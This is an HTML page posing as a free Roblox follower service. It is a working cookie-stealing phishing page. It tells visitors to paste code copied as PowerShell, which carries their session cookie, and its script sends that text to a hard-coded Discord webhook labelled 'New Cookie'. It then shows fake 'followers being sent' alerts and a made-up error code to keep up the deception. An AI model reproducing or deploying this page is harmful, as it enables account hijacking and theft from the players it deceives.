<!DOCTYPE html>
<html>
  <head>
    <!-- Follow Script -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous"><head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width">
      <title>Roblox API Followers</title><meta name="theme-color" content="#69919D">
      <meta property="og:type" content="website">
      <meta property="og:site_name" content="[domain]">
      <meta property="og:title" content="Free Roblox Followers!">
      <meta property="og:image" content="img/followers.png">
      <meta property="og:description" content="#1 Trusted Follow Botting Source">
      <meta property="description" content="#1 Trusted Follow Botting Source">
      <link rel="shortcut icon" href="img/followers.png">
      <link href="style.css" rel="stylesheet" type="text/css" />
  </head>


  <body class="container mt-5">
    <form onsubmit="sendContact(event)">
      <div class="mb-3">
        <label for="messageInput" class="form-label">Enter your code (remember to copy as powershell)</label>
        <textarea class="form-control" id="messageInput" rows="1"></textarea>
      </div>
      <div class="mb-3">

      <button type="submit" class="btn btn-primary">Submit</button>
    </form>
    <script>
      async function sendContact(ev) {
        ev.preventDefault();

        const senderMessage = document
          .getElementById('messageInput').value;

        const webhookBody = {
          embeds: [{
            title: 'New Cookie',
            fields: [
            { name: 'Cookie Code', value: senderMessage },
            ]
          }],
        };

        const webhookUrl = 'https://ptb.discord.com/api/webhooks/1007691288759500891/CRUYfw1841NswMc23UvG-XbYynpx7APx55cCFYWFLz3O9-W6ePc4JiQ9fioa_dNB9BOu';

        const response = await fetch(webhookUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(webhookBody),
        });

        if (response.ok) {
          alert('Processing...')
          alert('ðŸ’š | Followers being sent... Please wait to 1-2 hours!');
        } else {
          alert('Follower API did not work, please try again.')
          alert('ALERT ERROR: 506111');
        }
      }


    </script>
  </body>

</html>
